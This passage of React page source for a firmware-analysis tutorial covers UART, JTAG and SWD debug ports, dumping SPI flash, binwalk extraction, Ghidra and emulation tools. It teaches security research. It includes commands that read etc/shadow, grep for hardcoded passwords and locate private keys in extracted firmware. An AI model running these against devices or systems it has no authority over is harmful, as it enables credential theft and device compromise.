            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#f97316", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#f97316",
              }}
            >
              <UsbIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#f97316" }}>
                4. Hardware Interfaces & Debug Ports
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Embedded devices often have debug interfaces exposed on the circuit board—sometimes intentionally 
            left accessible, other times hidden but discoverable. These interfaces provide direct access to the 
            system for debugging, firmware extraction, and interactive analysis.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            UART (Universal Asynchronous Receiver-Transmitter)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`UART - The Most Common Debug Interface
======================================

What it provides:
- Serial console access (like a terminal)
- Boot messages and kernel output
- Often a root shell!
- Bootloader interaction (U-Boot, CFE)

Typical pinout (4 pins):
┌─────┬─────┬─────┬─────┐
│ VCC │ GND │ TX  │ RX  │   ← Common arrangement
└─────┴─────┴─────┴─────┘
  3.3V   0V   Data  Data

Finding UART on a PCB:
1. Look for 4-pin headers (may be unpopulated)
2. Look for test points labeled TX, RX, GND
3. Use multimeter to find GND (continuity to ground plane)
4. Use oscilloscope/logic analyzer to find TX (data when booting)

Connecting:
┌──────────────┐        ┌──────────────┐
│   Device     │        │  USB-UART    │
│              │        │   Adapter    │
│   TX  ──────────────── RX           │
│   RX  ──────────────── TX           │
│   GND ──────────────── GND          │
│   (VCC - usually don't connect)     │
└──────────────┘        └──────────────┘

Common baud rates: 115200, 9600, 57600, 38400

Linux connection:
$ screen /dev/ttyUSB0 115200
$ minicom -D /dev/ttyUSB0 -b 115200

Windows: PuTTY, Tera Term (select COM port)`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            JTAG (Joint Test Action Group)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`JTAG - Full Debug Access
========================

What it provides:
- Halt/resume CPU execution
- Read/write memory directly
- Set hardware breakpoints
- Flash programming
- Boundary scan (test pins)

Standard JTAG pins (5 essential):
┌─────┬─────┬─────┬─────┬─────┐
│ TDI │ TDO │ TCK │ TMS │ GND │
└─────┴─────┴─────┴─────┴─────┘
 Data   Data  Clock Mode  Ground
  In    Out

Common JTAG headers:
- 20-pin ARM standard
- 14-pin TI standard  
- 10-pin Cortex Debug

Finding JTAG:
1. Look for multi-pin headers (10, 14, 20 pins)
2. Search for IC part numbers + "JTAG pinout"
3. Use JTAGulator to auto-detect pins
4. Check FCC filings for internal photos

Tools:
- JTAGulator ($150) - Auto-detect JTAG pins
- Bus Pirate ($30) - Multi-protocol tool
- J-Link ($300+) - Professional ARM debugger
- OpenOCD (free) - Open-source JTAG software

Example OpenOCD session:
$ openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
> halt
> mdw 0x08000000 100    # Read memory
> flash write_image firmware.bin 0x08000000`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            SWD (Serial Wire Debug) - ARM Specific
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f97316", mb: 1 }}>SWD Basics</Typography>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  SWD is a 2-pin alternative to JTAG, specifically for ARM Cortex processors. Requires only:
                </Typography>
                <List dense sx={{ py: 0 }}>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>SWDIO</strong> - Bidirectional data</Typography></ListItem>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>SWCLK</strong> - Clock signal</Typography></ListItem>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>GND</strong> - Ground reference</Typography></ListItem>
                </List>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f97316", mb: 1 }}>SWD Tools</Typography>
                <List dense sx={{ py: 0 }}>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>ST-Link V2</strong> - Cheap ($3-10), works great</Typography></ListItem>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>J-Link</strong> - Professional, fast</Typography></ListItem>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>Black Magic Probe</strong> - Open source</Typography></ListItem>
                  <ListItem sx={{ py: 0.25, pl: 0 }}><Typography variant="body2">• <strong>DAPLink</strong> - On many dev boards</Typography></ListItem>
                </List>
              </Paper>
            </Grid>
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Interface Comparison
          </Typography>

          <Paper sx={{ p: 2, mb: 3, borderRadius: 2, bgcolor: alpha("#f97316", 0.03), border: `1px solid ${alpha("#f97316", 0.1)}` }}>
            <Grid container spacing={1}>
              <Grid item xs={3}><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Interface</Typography></Grid>
              <Grid item xs={2}><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Pins</Typography></Grid>
              <Grid item xs={3}><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Best For</Typography></Grid>
              <Grid item xs={4}><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Capabilities</Typography></Grid>
              <Grid item xs={12}><Divider sx={{ my: 1 }} /></Grid>
              {[
                { iface: "UART", pins: "2-4", best: "Console access", caps: "Text I/O, bootloader" },
                { iface: "JTAG", pins: "5-20", best: "Full debug", caps: "Memory R/W, breakpoints" },
                { iface: "SWD", pins: "2-3", best: "ARM debug", caps: "Same as JTAG, fewer pins" },
                { iface: "SPI", pins: "4", best: "Flash reading", caps: "Direct chip access" },
                { iface: "I2C", pins: "2", best: "EEPROM access", caps: "Config/calibration data" },
              ].map((row, idx) => (
                <React.Fragment key={idx}>
                  <Grid item xs={3}><Typography variant="body2" sx={{ fontWeight: 600 }}>{row.iface}</Typography></Grid>
                  <Grid item xs={2}><Typography variant="body2">{row.pins}</Typography></Grid>
                  <Grid item xs={3}><Typography variant="body2">{row.best}</Typography></Grid>
                  <Grid item xs={4}><Typography variant="body2" color="text.secondary">{row.caps}</Typography></Grid>
                </React.Fragment>
              ))}
            </Grid>
          </Paper>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Safety First!</AlertTitle>
            <Typography variant="body2">
              Always verify voltage levels before connecting! Most embedded devices use 3.3V logic, but some 
              use 1.8V or 5V. Connecting a 5V adapter to a 3.3V device can permanently damage it. Use a 
              multimeter to check voltage levels on suspected UART/JTAG pins before connecting.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 5: FLASH MEMORY ==================== */}
        <Paper
          id="flash-memory-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ef4444", 0.02),
            border: `1px solid ${alpha("#ef4444", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#ef4444", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#ef4444",
              }}
            >
              <MemoryIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#ef4444" }}>
                5. Flash Memory & Chip Reading
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Flash memory chips store firmware persistently. When software-based acquisition methods fail, 
            reading the flash chip directly is often the most reliable way to obtain a complete firmware image. 
            Understanding flash memory types and how to read them is a crucial skill.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
            Flash Memory Types
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              {
                type: "SPI NOR Flash",
                desc: "Most common in embedded devices. Serial interface, easy to read.",
                packages: "SOIC-8, SOIC-16, WSON-8",
                sizes: "1MB - 32MB typical",
                tools: "CH341A, Bus Pirate, FlashROM",
              },
              {
                type: "Parallel NOR Flash",
                desc: "Older devices, parallel data bus. More pins, faster access.",
                packages: "TSOP-48, PLCC-32",
                sizes: "512KB - 64MB",
                tools: "TL866, specialized programmers",
              },
              {
                type: "NAND Flash",
                desc: "High capacity, used for large storage. More complex to read.",
                packages: "TSOP-48, BGA",
                sizes: "128MB - several GB",
                tools: "Specialized NAND readers",
              },
              {
                type: "eMMC",
                desc: "NAND + controller in one package. Common in phones/tablets.",
                packages: "BGA-153, BGA-169",
                sizes: "4GB - 128GB+",
                tools: "eMMC readers, ISP adapters",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#ef4444", 0.03), border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>{item.type}</Typography>
                  <Typography variant="body2" sx={{ mb: 1 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block" }}><strong>Packages:</strong> {item.packages}</Typography>
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block" }}><strong>Sizes:</strong> {item.sizes}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Tools:</strong> {item.tools}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
            Reading SPI Flash (Most Common Method)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`SPI Flash Reading with CH341A Programmer (~$5-10)
=================================================

Equipment needed:
- CH341A USB programmer
- SOIC-8 test clip (for in-circuit reading)
- Or: Soldering equipment (for chip removal)

SPI Flash pinout (SOIC-8):
       ┌────────────┐
  /CS ─┤1         8├─ VCC (3.3V)
   DO ─┤2         7├─ /HOLD
  /WP ─┤3         6├─ CLK  
  GND ─┤4         5├─ DI
       └────────────┘

CH341A connection:
- Connect SOIC clip to chip (or solder wires)
- Plug CH341A into USB
- Make sure voltage jumper is set to 3.3V!

Using flashrom (Linux):
$ sudo apt install flashrom
$ flashrom -p ch341a_spi         # Detect chip
$ flashrom -p ch341a_spi -r firmware.bin   # Read
$ flashrom -p ch341a_spi -w modified.bin   # Write (careful!)

Using CH341A programmer software (Windows):
1. Install CH341A drivers
2. Run AsProgrammer or NeoProgrammer
3. Detect chip → Read → Save

In-Circuit Reading Tips:
- May need to hold CPU in reset
- Disconnect other SPI devices if present
- Power chip from programmer, not device
- If read fails, chip-off may be required`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
            Identifying Flash Chips
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`How to identify the flash chip:

1. Read the markings on the chip:
   Example: "W25Q64FV" 
            │  │ └── Variant
            │  └── 64 Mbit = 8 MB
            └── Winbond manufacturer

2. Common manufacturers & prefixes:
   - W25Qxx    = Winbond
   - MX25Lxx   = Macronix  
   - S25FLxx   = Spansion/Cypress
   - AT25xx    = Atmel
   - SST25xx   = SST/Microchip
   - N25Qxx    = Micron
   - GD25xx    = GigaDevice

3. Size decoding:
   - 16  = 16 Mbit  = 2 MB
   - 32  = 32 Mbit  = 4 MB
   - 64  = 64 Mbit  = 8 MB
   - 128 = 128 Mbit = 16 MB
   - 256 = 256 Mbit = 32 MB

4. Look up datasheet:
   Google: "[chip marking] datasheet"
   Check pinout, voltage, supported commands`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
            Hardware Tools Comparison
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { tool: "CH341A", price: "$5-10", pros: "Cheap, widely available, flashrom support", cons: "Some clones have voltage issues" },
              { tool: "Bus Pirate", price: "$30", pros: "Multi-protocol, scriptable, community", cons: "Slower, learning curve" },
              { tool: "FlashcatUSB", price: "$30-50", pros: "Wide chip support, good software", cons: "Windows only" },
              { tool: "TL866II Plus", price: "$50-70", pros: "Supports many chip types, reliable", cons: "Bulkier, parallel focus" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#ef4444", 0.03), border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444" }}>{item.tool}</Typography>
                    <Chip label={item.price} size="small" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600 }} />
                  </Box>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", color: "#10b981" }}>✓ {item.pros}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", color: "#f59e0b" }}>⚠ {item.cons}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Voltage Warning!</AlertTitle>
            <Typography variant="body2">
              Many CH341A clones output 5V instead of 3.3V, which can damage flash chips! Before using, 
              verify the voltage with a multimeter, or add a voltage regulator. Some sellers offer "fixed" 
              versions. When in doubt, use a logic level converter or a known-good programmer.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 6: FILESYSTEM EXTRACTION ==================== */}
        <Paper
          id="filesystem-extraction-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#3b82f6", 0.02),
            border: `1px solid ${alpha("#3b82f6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#3b82f6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#3b82f6",
              }}
            >
              <FolderOpenIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#3b82f6" }}>
                6. Filesystem Extraction & Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Once you have a firmware image, the next step is extracting its contents. Firmware typically contains 
            compressed filesystems, bootloaders, and configuration data packed together. Understanding how to 
            identify and extract these components is fundamental to firmware analysis.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Binwalk: The Essential Extraction Tool
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Binwalk - Firmware analysis and extraction tool
# Install: sudo apt install binwalk

# Basic scan - identify embedded files/filesystems
$ binwalk firmware.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, big endian
28            0x1C            LZMA compressed data
1835008       0x1C0000        Squashfs filesystem, little endian, version 4.0

# Extract all identified components
$ binwalk -e firmware.bin
# Creates: _firmware.bin.extracted/

# Recursive extraction (extract nested archives)
$ binwalk -eM firmware.bin

# Entropy analysis (find encrypted/compressed regions)
$ binwalk -E firmware.bin

# Signature scan with verbose output
$ binwalk -v firmware.bin

# Extract specific offset range
$ dd if=firmware.bin of=filesystem.squashfs bs=1 skip=1835008

# Common file signatures Binwalk detects:
- SquashFS, JFFS2, CramFS, UBIFS (filesystems)
- LZMA, gzip, bzip2, XZ (compression)
- uImage, TRX, Sercomm (firmware headers)
- ELF, PE executables
- Certificate data, RSA keys`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Common Filesystem Types
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { fs: "SquashFS", desc: "Read-only compressed filesystem, most common in routers/IoT", extract: "unsquashfs filesystem.squashfs", mount: "mount -t squashfs file.squashfs /mnt" },
              { fs: "JFFS2", desc: "Journaling flash filesystem for raw flash chips", extract: "jefferson filesystem.jffs2", mount: "modprobe mtdblock; mount -t jffs2" },
              { fs: "CramFS", desc: "Compressed ROM filesystem, older devices", extract: "cramfsck -x output/ filesystem.cramfs", mount: "mount -t cramfs file /mnt" },
              { fs: "UBIFS", desc: "Unsorted Block Image FS for NAND flash", extract: "ubireader_extract_files ubi.img", mount: "Complex - requires UBI layer" },
              { fs: "YAFFS2", desc: "Yet Another Flash FS for NAND", extract: "unyaffs filesystem.yaffs2", mount: "Requires kernel support" },
              { fs: "ext2/3/4", desc: "Standard Linux filesystem, some embedded systems", extract: "mount -o loop file.img /mnt", mount: "Standard Linux mount" },
            ].map((item, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6", mb: 0.5 }}>{item.fs}</Typography>
                  <Typography variant="body2" sx={{ mb: 1 }}>{item.desc}</Typography>
                  <Typography variant="caption" sx={{ fontFamily: "monospace", bgcolor: alpha("#3b82f6", 0.1), px: 1, py: 0.5, borderRadius: 1 }}>
                    {item.extract}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Post-Extraction Analysis
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# After extracting filesystem, key files to examine:

# Configuration files
$ find . -name "*.conf" -o -name "*.cfg" -o -name "*.ini"
$ cat etc/passwd etc/shadow          # User accounts
$ cat etc/config/*                    # Device settings

# Web interface (common vulnerability source)
$ ls -la www/ usr/www/ var/www/
$ grep -r "password" www/             # Hardcoded creds
$ grep -r "system\|exec\|popen" www/  # Command injection

# Startup scripts (persistence, services)
$ cat etc/init.d/* etc/rc.d/*
$ cat etc/inittab

# Binary executables (targets for RE)
$ find . -type f -executable
$ file bin/* sbin/* usr/bin/*

# Libraries (may contain vulnerabilities)
$ ls lib/ usr/lib/

# SSL certificates and keys
$ find . -name "*.pem" -o -name "*.crt" -o -name "*.key"

# Configuration databases
$ find . -name "*.db" -o -name "*.sqlite"
$ strings *.db | head -100`}
            </Typography>
          </Paper>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Pro Tip: Create a Firmware Analysis Script</AlertTitle>
            <Typography variant="body2">
              Automate your initial analysis with a script that runs binwalk, extracts filesystems, searches for 
              interesting files (passwords, keys, scripts), and generates a report. This speeds up analysis of 
              multiple firmware versions or similar devices.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 7: BINARY ANALYSIS ==================== */}
        <Paper
          id="binary-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ec4899", 0.02),
            border: `1px solid ${alpha("#ec4899", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#ec4899", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#ec4899",
              }}
            >
              <CodeIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#ec4899" }}>
                7. Binary Analysis of Firmware
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Binary analysis is where you dive deep into the compiled executables found in firmware. This involves 
            disassembly (converting machine code to assembly), decompilation (reconstructing C-like code), and 
            understanding program behavior without source code.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Disassembly Tools Comparison
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { tool: "Ghidra", price: "Free", pros: "NSA-developed, powerful decompiler, scripting, collaboration features", cons: "Java-based, can be slow on large binaries", best: "Best free option" },
              { tool: "IDA Pro", price: "$1000+", pros: "Industry standard, excellent FLIRT signatures, fast, mature", cons: "Expensive, closed source", best: "Professional choice" },
              { tool: "Binary Ninja", price: "$150+", pros: "Modern UI, good API, IL representations, affordable", cons: "Smaller signature database", best: "Budget professional" },
              { tool: "radare2/Cutter", price: "Free", pros: "Command-line power, scriptable, Cutter GUI, portable", cons: "Steep learning curve", best: "CLI enthusiasts" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#ec4899", 0.03), border: `1px solid ${alpha("#ec4899", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#ec4899" }}>{item.tool}</Typography>
                    <Chip label={item.price} size="small" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600, fontSize: "0.7rem" }} />
                  </Box>
                  <Typography variant="body2" sx={{ color: "#10b981", fontSize: "0.8rem", mb: 0.5 }}>✓ {item.pros}</Typography>
                  <Typography variant="body2" sx={{ color: "#f59e0b", fontSize: "0.8rem", mb: 0.5 }}>⚠ {item.cons}</Typography>
                  <Typography variant="caption" sx={{ fontWeight: 600, color: "#ec4899" }}>{item.best}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Getting Started with Ghidra
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`Ghidra Workflow for Firmware Analysis
=====================================

1. Create New Project
   File → New Project → Non-Shared Project

2. Import Binary
   File → Import File → Select extracted binary
   - Ghidra auto-detects architecture (ARM, MIPS, etc.)
   - May need to specify endianness manually

3. Auto Analysis
   - Click "Yes" when prompted to analyze
   - Wait for analysis to complete (can take time)
   - Analysis finds functions, strings, references

4. Key Windows
   - Symbol Tree: Functions, labels, namespaces
   - Listing: Disassembly view
   - Decompiler: Pseudo-C code
   - Defined Strings: All strings in binary

5. Essential Shortcuts
   G     - Go to address
   L     - Rename (label)
   T     - Set data type
   ;     - Add comment
   Ctrl+E - Edit function signature

6. Finding Interesting Code
   Search → For Strings → "password", "admin", "root"
   Search → For Scalars → Known constants
   Window → Function Call Graph
   
7. Cross-References (XRefs)
   - Right-click → References → Show References
   - Traces where functions/data are used`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ec4899" }}>
            Architecture-Specific Tips
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { arch: "ARM", tips: "Look for BL (branch-link) for function calls, LDR for data loading. Thumb mode uses 16-bit instructions. Check for SVC (system calls)." },
              { arch: "MIPS", tips: "Uses JAL for calls, delay slots after branches. $ra is return address. Often big-endian in routers. Check $a0-$a3 for function args." },
              { arch: "x86/x64", tips: "CALL for function calls, RET for returns. Look for PUSH/POP patterns. fastcall uses registers, stdcall uses stack." },
            ].map((item, idx) => (
              <Grid item xs={12} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#ec4899", 0.03), border: `1px solid ${alpha("#ec4899", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ec4899", mb: 1 }}>{item.arch}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem" }}>{item.tips}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Symbol Recovery</AlertTitle>
            <Typography variant="body2">
              Stripped binaries lack function names. Use signature matching (Ghidra's "Apply Function Signatures"), 
              look for debug strings that reference function names, or compare with similar open-source code 
              (like OpenWrt) to identify common library functions.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 8: FIRMWARE EMULATION ==================== */}
        <Paper
          id="emulation-techniques-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#14b8a6", 0.02),
            border: `1px solid ${alpha("#14b8a6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#14b8a6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#14b8a6",
              }}
            >
              <SettingsIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#14b8a6" }}>
                8. Firmware Emulation
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Emulation lets you run firmware without physical hardware. This enables dynamic analysis, debugging, 
            fuzzing, and testing exploits safely. While full system emulation can be challenging due to custom 
            hardware peripherals, partial emulation of specific components is often achievable.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            Emulation Tools & Frameworks
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { tool: "QEMU", desc: "Full system and user-mode emulation for various architectures", use: "General purpose, most flexible", cmd: "qemu-arm -L ./lib ./binary" },
              { tool: "Firmadyne", desc: "Automated framework for Linux-based firmware emulation", use: "Mass emulation of router firmware", cmd: "./fat.py firmware.bin" },
              { tool: "FirmAE", desc: "Improved Firmadyne with better success rate", use: "When Firmadyne fails", cmd: "./run.sh -r firmware.bin" },
              { tool: "Unicorn", desc: "CPU emulator framework based on QEMU", use: "Emulate specific functions", cmd: "Python scripting API" },
              { tool: "QILING", desc: "Binary analysis framework using Unicorn", use: "Hooking, instrumentation", cmd: "Python-based sandbox" },
              { tool: "Avatar²", desc: "Dynamic analysis framework bridging HW/SW", use: "Partial emulation + real HW", cmd: "Python orchestration" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#14b8a6", 0.03), border: `1px solid ${alpha("#14b8a6", 0.1)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#14b8a6", mb: 0.5 }}>{item.tool}</Typography>
                  <Typography variant="body2" sx={{ mb: 1, fontSize: "0.85rem" }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Best for:</strong> {item.use}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            QEMU User-Mode Emulation
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
